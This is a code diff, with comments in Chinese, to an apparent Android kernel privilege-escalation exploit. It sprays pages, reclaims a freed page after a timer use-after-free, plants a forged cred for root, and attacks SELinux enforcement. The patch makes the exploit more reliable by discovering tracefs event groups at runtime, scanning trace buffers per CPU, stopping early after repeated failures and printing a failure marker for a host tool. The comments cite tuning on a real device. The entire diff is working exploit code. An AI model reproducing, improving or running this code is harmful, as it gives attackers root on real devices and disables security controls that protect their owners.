@@ -7,6 +7,7 @@
  */
 
 #define _GNU_SOURCE 1
+#include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <inttypes.h>
@@ -449,6 +450,22 @@ static uint64_t object_pfn(uint64_t ptr)
  * 宿主那边早就超时判失败了，用户只会看到「卡死」。
  */
 #define EXPLOIT_BUDGET_SEC 240
+/*
+ * 失败标记（机器可读）。
+ *
+ * 宿主在等 rootd 就绪时盯着这个标记：原生体自己放弃时就立刻返回失败，
+ * 而不是空等满 300 s（真机实测：原生体 08:44:14 就已经放弃了，宿主
+ * 08:46:28 才报超时，中间白等 134 s）。
+ */
+#define EXPLOIT_FAILED_MARKER "C98260_EXPLOIT_FAILED=1"
+
+/*
+ * 连续多少轮打不中就提前收手。
+ *
+ * 真机上一轮 12/12 全败（每轮 ~5.8 s），SELinux 阶段 + cred 阶段加起来
+ * 白等 ~70 s，最后还是同一个结论。连续失败到阈值就收手，把时间还给用户。
+ */
+#define CONSEC_FAIL_MAX 8
 static time_t g_deadline;
 
 /** 预算是否已经用完（未设置截止时刻时不算用完）。 */
@@ -548,10 +565,37 @@ static ssize_t read_trace_file(const char *path, char **buf_out)
 }
 
 /*
- * 找一条 "… mm_page_alloc: pfn=0x1234 order=0 …" 记录。
+ * 在一段 trace 文本里找一条 "… mm_page_alloc: pfn=0x1234 order=0 …" 记录。
  * 整块 read + memmem 取代逐行 fgets：命中判定要放进喷洒循环里反复调用，
  * 逐行解析在 30 MB/核的 ring 上一次就要几百毫秒。
  */
+static int trace_find_pfn_in_buf(char *buf, ssize_t len, const char *kind,
+				 const char *needle, int *order_out)
+{
+	char *p, *end = buf + len;
+
+	for (p = buf;
+	     (p = memmem(p, (size_t)(end - p), needle, strlen(needle))) != NULL;
+	     p++) {
+		char *line = p, *eol;
+
+		while (line > buf && line[-1] != '\n')
+			line--;
+		eol = strchr(p, '\n');
+		if (!eol)
+			eol = end;
+		if (!strstr(line, kind))
+			continue;
+		if (order_out) {
+			char *op = strstr(line, "order=");
+			*order_out = op ? atoi(op + 6) : -1;
+		}
+		return 1;
+	}
+	return 0;
+}
+
+/* 扫全部 CPU 的 ring（找不到返回 0）。 */
 static int trace_find_pfn(const char *kind, uint64_t pfn, int *order_out)
 {
 	char needle[32], path[128];
@@ -560,36 +604,45 @@ static int trace_find_pfn(const char *kind, uint64_t pfn, int *order_out)
 
 	snprintf(needle, sizeof(needle), "pfn=0x%" PRIx64, pfn);
 	for (cpu = 0; cpu < ncpu; cpu++) {
-		char *buf, *p, *end;
+		char *buf;
 		ssize_t len;
+		int found;
 
 		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
 		len = read_trace_file(path, &buf);
 		if (len <= 0)
 			continue;
-		end = buf + len;
-		for (p = buf;
-		     (p = memmem(p, (size_t)(end - p), needle, strlen(needle))) != NULL;
-		     p++) {
-			char *line = p, *eol;
-
-			while (line > buf && line[-1] != '\n')
-				line--;
-			eol = strchr(p, '\n');
-			if (!eol)
-				eol = end;
-			if (!strstr(line, kind))
-				continue;
-			if (order_out) {
-				char *op = strstr(line, "order=");
-				*order_out = op ? atoi(op + 6) : -1;
-			}
-			free(buf);
-			return 1;
-		}
+		found = trace_find_pfn_in_buf(buf, len, kind, needle, order_out);
 		free(buf);
+		if (found)
+			return 1;
 	}
 	return 0;
+}
+
+/*
+ * 只扫一个 CPU 的 ring。
+ *
+ * 受害者页被 free 之后待在**释放它那个核**的 per-CPU 空闲链里，能重新拿到
+ * 它的分配也只发生在那个核上 —— 所以喷洒窗口内先只看释放者核：文本量是
+ * 全核的 1/8，判定耗时跟着降一个数量级（真机一轮从 ~5.8 s 降到 ~2 s）。
+ */
+static int trace_find_pfn_on_cpu(const char *kind, uint64_t pfn, int *order_out,
+				 int cpu)
+{
+	char needle[32], path[128];
+	char *buf;
+	ssize_t len;
+	int found;
+
+	snprintf(needle, sizeof(needle), "pfn=0x%" PRIx64, pfn);
+	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
+	len = read_trace_file(path, &buf);
+	if (len <= 0)
+		return 0;
+	found = trace_find_pfn_in_buf(buf, len, kind, needle, order_out);
+	free(buf);
+	return found;
 }
 
 /* 统计 8 个 CPU 的 trace 里 kind 出现的次数（诊断用）。 */
@@ -618,17 +671,97 @@ static long trace_count_kind(const char *kind)
 	return total;
 }
 
+/* 只统计某一个 CPU 的 trace 里 kind 出现的次数（探针用，省一次全核扫）。 */
+static long trace_count_kind_on_cpu(const char *kind, int cpu)
+{
+	char path[128];
+	char *buf, *p, *end;
+	long total = 0;
+	ssize_t len;
+
+	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
+	len = read_trace_file(path, &buf);
+	if (len <= 0)
+		return 0;
+	end = buf + len;
+	for (p = buf;
+	     (p = memmem(p, (size_t)(end - p), kind, strlen(kind))) != NULL;
+	     p++)
+		total++;
+	free(buf);
+	return total;
+}
+
+/*
+ * mm_page_alloc / mm_page_free 所在的 tracefs 事件组（运行期自发现）。
+ *
+ * 为什么不能写死 "kmem"：这两个 tracepoint 在不同内核版本里换过归属
+ * （老内核在 kmem 组，新内核挪到了 mm 组）。写死组名时 open() 直接 ENOENT
+ * —— 看上去像「权限被拒」，其实是路径根本不存在，于是事件永远开不了火，
+ * 命中判定退化成「看不见 == 没有」，每一轮都白喷 6 秒。
+ *
+ * 真机症状（Xiaomi M154FF / 6.18.21-android17）：同一台机器上
+ * kmem_cache_alloc 用 "kmem" 组能开火（armed=trigger），而 mm_page_alloc
+ * 用 "kmem" 组怎么开都不动 —— 组名对不上。
+ */
+static char g_page_group_alloc[64];
+static char g_page_group_free[64];
+
+/* 事件是否真的开火了。0 = 判定不可信（看不见 ring 里有没有目标页的记录）。 */
+static int g_page_events_live;
+
+/* 找到 event 所在的组名（写入 out）。找不到返回 -1。 */
+static int find_event_group(const char *event, char *out, size_t out_len)
+{
+	static const char *known[] = { "kmem", "mm", "mm_events", "page_alloc" };
+	DIR *d;
+	struct dirent *de;
+	size_t i;
+
+	/* 先试常见组名：命中就直接用（省掉一次目录扫描）。 */
+	for (i = 0; i < sizeof(known) / sizeof(known[0]); i++) {
+		char path[192];
+
+		snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable",
+			 known[i], event);
+		if (access(path, F_OK) == 0) {
+			snprintf(out, out_len, "%s", known[i]);
+			return 0;
+		}
+	}
+	/* 再全量扫 events/ 目录（组名被改过时的兜底）。 */
+	d = opendir(TRACE "/events");
+	if (!d)
+		return -1;
+	while ((de = readdir(d)) != NULL) {
+		char path[192];
+
+		if (de->d_name[0] == '.')
+			continue;
+		snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable",
+			 de->d_name, event);
+		if (access(path, F_OK) == 0) {
+			snprintf(out, out_len, "%s", de->d_name);
+			closedir(d);
+			return 0;
+		}
+	}
+	closedir(d);
+	return -1;
+}
+
 /*
  * 给事件装 pfn 过滤器：ring 里只留目标页的记录。
  * 两个作用：(a) 扫描量从 240 MB 掉到几 KB；(b) mm_page_alloc 是热点事件，
  * 不加过滤会被冲掉 ring —— 冲掉就再也找不到目标页的 alloc 记录，
  * 又是一次「假阴性」（v1 每轮 hit=0 的另一个可能来源）。
  */
-static int set_pfn_filter(const char *event, uint64_t p1, uint64_t p2)
+static int set_pfn_filter(const char *group, const char *event, uint64_t p1,
+			   uint64_t p2)
 {
-	char path[128], expr[160];
+	char path[160], expr[160];
 
-	snprintf(path, sizeof(path), TRACE "/events/kmem/%s/filter", event);
+	snprintf(path, sizeof(path), TRACE "/events/%s/%s/filter", group, event);
 	if (p2 && p2 != p1)
 		snprintf(expr, sizeof(expr), "pfn == %#llx || pfn == %#llx",
 			 (unsigned long long)p1, (unsigned long long)p2);
@@ -638,47 +771,128 @@ static int set_pfn_filter(const char *event, uint64_t p1, uint64_t p2)
 	return write_file(path, expr);
 }
 
+/* 清掉上一轮留下的 pfn 过滤器（过滤器是事件级属性，不会随事件 disable 消失）。 */
+static void reset_page_filters(void)
+{
+	if (g_page_group_alloc[0]) {
+		char path[192];
+
+		snprintf(path, sizeof(path), TRACE "/events/%s/mm_page_alloc/filter",
+			 g_page_group_alloc);
+		write_file(path, "0\n");
+	}
+	if (g_page_group_free[0]) {
+		char path[192];
+
+		snprintf(path, sizeof(path), TRACE "/events/%s/mm_page_free/filter",
+			 g_page_group_free);
+		write_file(path, "0\n");
+	}
+}
+
 /*
- * 打开 mm_page_alloc / mm_page_free。
- * 直接写 enable 最稳；但这台机器上 tracefs 事件文件的直接写被拒过
- * （日志里 kmem_cache_alloc 是 armed=trigger enable=?），所以两条路都走：
- * 直接写优先，rss_stat trigger 兜底，最后 kick 一次 RSS 让 trigger 开火。
+ * 打开一个 mm_page_* 事件。三条路依次尝试，每条都记 errno：
+ *   1. 直接写 events/<组>/<事件>/enable —— 最稳；
+ *   2. 写 set_event（"<组>:<事件>"）—— 直写被拒时的正规入口；
+ *   3. rss_stat trigger 的 enable_event:<组>:<事件> + kick_rss —— 兜底。
+ * 返回 0 = 至少一条路写入成功（**不代表事件真的开火**，仍要 probe 复核）。
+ */
+static int arm_one_page_event(const char *event, const char *group)
+{
+	char path[192], cmd[160];
+	int mode = 0, e1 = 0, e2 = 0, e3 = 0;
+
+	snprintf(path, sizeof(path), TRACE "/events/%s/%s/enable", group, event);
+	if (!write_file(path, "1\n")) {
+		mode = 1;
+	} else {
+		e1 = errno;
+		snprintf(path, sizeof(path), TRACE "/set_event");
+		snprintf(cmd, sizeof(cmd), "%s:%s\n", group, event);
+		if (!write_file(path, cmd)) {
+			mode = 2;
+		} else {
+			e2 = errno;
+			snprintf(cmd, sizeof(cmd), "enable_event:%s:%s\n", group, event);
+			if (!trigger_cmd(cmd))
+				mode = 3;
+			else
+				e3 = errno;
+		}
+	}
+	if (mode == 3)
+		kick_rss();
+	dprintf(STDOUT_FILENO,
+		"[trace] %s group=%s arm=%s errno(direct=%d set_event=%d trigger=%d)\n",
+		event, group,
+		mode == 1 ? "direct" : mode == 2 ? "set_event" :
+		mode == 3 ? "trigger" : "failed", e1, e2, e3);
+	return mode ? 0 : -1;
+}
+
+/*
+ * 打开 mm_page_alloc / mm_page_free（组名运行期自发现）。
+ * 返回值：成功 arm 的事件个数。
  */
 static int arm_page_events(void)
 {
-	int direct = 0;
+	int ok = 0;
 
-	if (!write_file(TRACE "/events/kmem/mm_page_alloc/enable", "1\n"))
-		direct++;
-	if (!write_file(TRACE "/events/kmem/mm_page_free/enable", "1\n"))
-		direct++;
-	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
-	trigger_cmd("enable_event:kmem:mm_page_free\n");
-	kick_rss();
-	return direct;
+	if (!find_event_group("mm_page_alloc", g_page_group_alloc,
+			      sizeof(g_page_group_alloc))) {
+		if (!arm_one_page_event("mm_page_alloc", g_page_group_alloc))
+			ok++;
+	} else {
+		dprintf(STDOUT_FILENO,
+			"[trace] mm_page_alloc not found under " TRACE "/events/*\n");
+	}
+	if (!find_event_group("mm_page_free", g_page_group_free,
+			      sizeof(g_page_group_free))) {
+		if (!arm_one_page_event("mm_page_free", g_page_group_free))
+			ok++;
+	} else {
+		dprintf(STDOUT_FILENO,
+			"[trace] mm_page_free not found under " TRACE "/events/*\n");
+	}
+	return ok;
 }
 
 /*
  * 自检：mm_page_alloc/free 到底开着没有？
  * 分配 + 释放一个匿名页，看 trace 里有没有对应记录。
- * 没有 → 后面所有「没命中」都是假阴性，这轮继续喷纯属浪费。
+ * 没有 → 后面所有「没命中」都是假阴性。
+ *
+ * 只扫「做 mmap/munmap 的那个核」+ 兜底全核：探针自己的记录就在那两个核上，
+ * 全核扫一遍在 30 MB/核 的 ring 上要几百毫秒，而每轮都要做一次。
  */
 static int probe_page_events(void)
 {
 	void *p;
 	struct timespec nap = { .tv_nsec = 60 * 1000 * 1000 };
 	long a, f;
+	int cpu_alloc = -1, cpu_free = -1;
 
 	p = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
 		 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	if (p == MAP_FAILED)
 		return -1;
 	((volatile unsigned char *)p)[0] = 1;
+	cpu_alloc = sched_getcpu();
 	nanosleep(&nap, NULL);
 	munmap(p, 65536);
+	cpu_free = sched_getcpu();
 	nanosleep(&nap, NULL);
-	a = trace_count_kind("mm_page_alloc:");
-	f = trace_count_kind("mm_page_free:");
+	a = 0;
+	f = 0;
+	if (cpu_alloc >= 0)
+		a = trace_count_kind_on_cpu("mm_page_alloc:", cpu_alloc);
+	if (cpu_free >= 0)
+		f = trace_count_kind_on_cpu("mm_page_free:", cpu_free);
+	if ((a <= 0 || f <= 0) && cpu_alloc >= 0) {
+		/* 探针记录可能被冲掉或落在别的核上：退回全核扫一次。 */
+		a = trace_count_kind("mm_page_alloc:");
+		f = trace_count_kind("mm_page_free:");
+	}
 	return (a > 0 && f > 0) ? 0 : -1;
 }
 
@@ -1624,6 +1838,7 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	uint64_t pf = 0;
 	int free_seen = 0;
 	int filter_ok = 1;
+	int uncertain = 0;
 	unsigned off_in_page = 0;
 	int risky;
 	struct timespec start, now;
@@ -1636,8 +1851,6 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	memset(pat, 0, SPRAY_BUF_MAX);
 
 	/* --- 1. 事件 arm + 自检：没开火的话，后面全是假阴性 --- */
-	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
-	trigger_cmd("enable_event:kmem:mm_page_free\n");
 	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_RECLAIM))) {
 		munmap(pat, SPRAY_BUF_MAX);
 		return -1;
@@ -1648,28 +1861,35 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 		munmap(pat, SPRAY_BUF_MAX);
 		return -1;
 	}
+	/*
+	 * arm + 自检。组名运行期自发现（不同内核版本把 mm_page_* 放在不同的
+	 * 事件组里，写死 "kmem" 会让 enable/filter 写到不存在的路径上）。
+	 */
 	arm_page_events();
 	/*
 	 * 复位上一轮留下的 pfn 过滤器：过滤器是事件级属性，不会随事件被
 	 * disable 而消失。不复位的话，本轮自检看到的 ring 里只有上一轮的
 	 * pfn 记录，会把「事件没开火」误判成「事件开着」。
 	 */
-	write_file(TRACE "/events/kmem/mm_page_alloc/filter", "0\n");
-	write_file(TRACE "/events/kmem/mm_page_free/filter", "0\n");
-	if (probe_page_events())
+	reset_page_filters();
+	if (probe_page_events()) {
+		g_page_events_live = 0;
 		dprintf(STDOUT_FILENO,
 			"[reclaim] WARN: mm_page_alloc/free 没 enable，命中判定不可信\n");
+	} else {
+		g_page_events_live = 1;
+	}
 
 	/* --- 2. pfn 过滤器：ring 里只留受害者页，扫描量与冲刷风险同时降下来 --- */
-	if (set_pfn_filter("mm_page_alloc", cand, head) ||
-	    set_pfn_filter("mm_page_free", cand, head)) {
+	if (!g_page_group_alloc[0] || !g_page_group_free[0] ||
+	    set_pfn_filter(g_page_group_alloc, "mm_page_alloc", cand, head) ||
+	    set_pfn_filter(g_page_group_free, "mm_page_free", cand, head)) {
 		filter_ok = 0;
 		/*
 		 * 没有过滤器的退化路径：ring 里全是系统级的 mm_page_alloc
-		 * （热点事件），30 MB/核扫一次要几百毫秒 —— 命中判定每 16 写
-		 * 做一次的话，一轮光扫描就要几十秒。
-		 * 所以把 ring 缩到 4 MB/核：扫描量降到 1/8，代价是 ring 只留
-		 * 约一秒历史 —— 判定密度提高正好补上这个缺口。
+		 * （热点事件），扫一次要几百毫秒。所以把 ring 缩到 4 MB/核：
+		 * 扫描量降到 1/8，代价是 ring 只留约一秒历史。
+		 * 真正的提速来自「只看释放者核」（判定量 1/8）。
 		 */
 		write_trace_buf_kb(4096);
 		dprintf(STDOUT_FILENO,
@@ -1696,10 +1916,14 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 
 	/* --- 4. 等受害者页被 free：拿内核报出来的真实 pfn 与 order --- */
 	{
-		/* 有过滤器：ring 里只有目标页的记录，扫描几毫秒 → 15 ms 轮询。
-		 * 无过滤器：每次扫描都要读 8×4 MB → 轮询放到 100 ms。 */
-		struct timespec pause = { .tv_nsec = (filter_ok ? 15 : 100) * 1000 * 1000 };
-		int waitn = filter_ok ? (g_fast ? 140 : 280) : (g_fast ? 30 : 60);
+		/*
+		 * 有过滤器：ring 里只有目标页的记录，扫描几毫秒 → 15 ms 轮询。
+		 * 无过滤器：mm_page_free 记录会被 mm_page_alloc 洪水冲掉，等也
+		 * 等不到（真机实测 free_seen 恒为 0），干等 3 s 纯属浪费 ——
+		 * 缩短到 ~0.6 s 后直接走 order-0 兜底。
+		 */
+		struct timespec pause = { .tv_nsec = (filter_ok ? 15 : 60) * 1000 * 1000 };
+		int waitn = filter_ok ? (g_fast ? 140 : 280) : (g_fast ? 10 : 20);
 
 		for (int i = 0; i < waitn && !free_seen; i++) {
 			nanosleep(&pause, NULL);
@@ -1765,9 +1989,24 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 			} else if (++fd >= nfd) {
 				break;
 			}
-			if ((i & 15) == 15) {
-				hit = trace_find_pfn("mm_page_alloc:", cand, NULL) ||
-				      trace_find_pfn("mm_page_alloc:", head, NULL);
+			if ((i & 31) == 31) {
+				/*
+				 * 判定分两档：
+				 *   · 还钉在释放者核上（i < 64）——受害者页就在那个
+				 *     核的 per-CPU 空闲链里，只有那个核的分配能重新
+				 *     拿到它；只扫那一个核的 ring（文本量 1/8）。
+				 *   · 已经轮转到别的核 —— 扫全部核（每轮只做一次）。
+				 * 判定频率也从每 16 写降到每 32 写：写得太密只是
+				 * 反复读同一批 ring 文本，对命中率没帮助。
+				 */
+				if (i < 64)
+					hit = trace_find_pfn_on_cpu("mm_page_alloc:", cand,
+								  NULL, rcpu) ||
+					      trace_find_pfn_on_cpu("mm_page_alloc:", head,
+								  NULL, rcpu);
+				else
+					hit = trace_find_pfn("mm_page_alloc:", cand, NULL) ||
+					      trace_find_pfn("mm_page_alloc:", head, NULL);
 				if (hit)
 					break;
 			}
@@ -1780,9 +2019,29 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 			break;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
+	/*
+	 * 命中判定的三种结果：
+	 *   hit            —— 真看到目标页被重新分配（真阳性）；
+	 *   !hit && live   —— 事件开着、确实没看到（真阴性）：本轮白喷；
+	 *   !hit && !live  —— 事件没开火，**看不见**不等于**没有**。
+	 *
+	 * 第三种以前被当成「确定没命中」，直接判本轮失败 —— 真机日志里
+	 * 12/12 全是这样收场（writes=2389 hit=0），每轮白等 5.8 s，最后
+	 * 还只能报「未命中已知失败模式」。
+	 *
+	 * 但 one_uaf 后面还有两道**真判定**：child 必须被 SIGKILL（说明
+	 * 竞态真的打中了内核的 timer 拆解路径），以及 ask_child 的
+	 * uid/euid==0（说明伪造的 cred 真的生效）。既然后面还有真判定，
+	 * 就让它们去裁决，不在回收层一票否决。
+	 */
+	uncertain = !hit && !g_page_events_live;
+	if (uncertain)
+		dprintf(STDOUT_FILENO,
+			"[reclaim] 判定不可信（事件没开火）：按可能命中继续，"
+			"由后续 child SIGKILL / uid 校验裁决\n");
 	dprintf(STDOUT_FILENO,
-		"[reclaim] writes=%d hit=%d pf=%#" PRIx64 " order=%d\n",
-		writes, hit, pf, order);
+		"[reclaim] writes=%d hit=%d pf=%#" PRIx64 " order=%d events_live=%d\n",
+		writes, hit, pf, order, g_page_events_live);
 	quiet_reclaim_trace();
 
 	/* --- 7. 负 uid 防护 --- */
@@ -1797,9 +2056,11 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 	/*
 	 * 顺序很重要：持有者必须在 close 之前 fork —— 它靠继承来的 fd
 	 * 把这些页钉在 slab 上；先 close 再 fork 就等于什么都没钉住。
+	 * 判定不可信时同样要钉：本轮**确实**铺过页，不能排除受害者页就是
+	 * 那一页，放回 buddy 就可能被 cred_jar 领走 → 负 uid。
 	 */
-	if (hit)
-		quarantine_hold();     /* 命中这轮铺的页永远不回到 buddy */
+	if (hit || uncertain)
+		quarantine_hold();     /* 命中/存疑这轮铺的页永远不回到 buddy */
 	if (risky) {
 		dprintf(STDOUT_FILENO,
 			"[reclaim] 铺页值含负 uid 风险位，本轮铺过的页隔离不释放；"
@@ -1810,7 +2071,7 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 		close_pipe_spray();
 	}
 	munmap(pat, SPRAY_BUF_MAX);
-	return hit ? 0 : -1;
+	return (hit || uncertain) ? 0 : -1;
 }
 
 static int one_uaf(uint64_t target)
@@ -2532,6 +2793,8 @@ int uaf_plant_main(int argc, char **argv)
 	g_deadline = time(NULL) + EXPLOIT_BUDGET_SEC;
 	{
 		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
+		int consec = 0;
+
 		for (int i = 1; i <= 12; i++) {
 			char buf[8] = { 0 };
 			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
@@ -2553,12 +2816,20 @@ int uaf_plant_main(int argc, char **argv)
 			dprintf(STDOUT_FILENO,
 				"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
 				i, sel);
-			if (!one_uaf(sel))
+			if (!one_uaf(sel)) {
 				read_enforce();
+				consec = 0;
+			} else if (++consec >= CONSEC_FAIL_MAX) {
+				dprintf(STDOUT_FILENO,
+					"[budget] selinux phase: %d consecutive failed attempts, giving up early\n",
+					consec);
+				break;
+			}
 		}
 	}
 	g_plant_cred = 1;
 	int rooted = 0;
+	int consec = 0;
 	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1;
 		int fixed_uid = -1, fixed_suid = -1;
@@ -2571,8 +2842,16 @@ int uaf_plant_main(int argc, char **argv)
 		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
 		log_sync();
 		g_plant_cred = 1;
-		if (one_uaf(0))
+		if (one_uaf(0)) {
+			if (++consec >= CONSEC_FAIL_MAX) {
+				dprintf(STDOUT_FILENO,
+					"[budget] cred phase: %d consecutive failed attempts, giving up early\n",
+					consec);
+				break;
+			}
 			continue;
+		}
+		consec = 0;
 		g_plant_cred = 0;
 		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
 		log_sync();
@@ -2598,11 +2877,16 @@ int uaf_plant_main(int argc, char **argv)
 	}
 	if (!rooted) {
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
+		/*
+		 * 机器可读的失败标记：宿主看到它就立刻结束等待并报错，
+		 * 不用空等满 300 s（真机实测白等 134 s 才报超时）。
+		 */
+		dprintf(STDOUT_FILENO, "%s\n", EXPLOIT_FAILED_MARKER);
 		log_sync();
 		/*
 		 * 失败路径：先把抬高的环形缓冲还回去。
-		 * 这个进程接下来会一直挂着（host 等 rootd 超时），不能让它
-		 * 顺手把上百 MiB 内核内存也一起挂住。
+		 * 这个进程接下来会一直挂着（host 已经在标记处返回失败），
+		 * 不能让它顺手把上百 MiB 内核内存也一起挂住。
 		 */
 		restore_trace_state();
 		for (;;)
